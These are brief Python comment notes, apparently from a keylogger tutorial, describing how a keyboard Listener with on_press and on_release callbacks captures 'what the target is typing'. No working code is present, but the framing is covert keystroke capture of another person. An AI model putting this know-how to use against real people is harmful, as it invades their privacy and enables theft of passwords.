# < ------------ NOTES ------------ >

# Listener is used listen what the target is typing and capture the typed keys
# Listener has two optional parameters that you can provide a function as an argument for
#   on_press= <function name>
#   on_release= <function name>

# The functions that were passed as arguments will recieve the captured key as an argument
# .join() is used to begin listening to the keys typed
# return False in the on_release_function will stop the listener
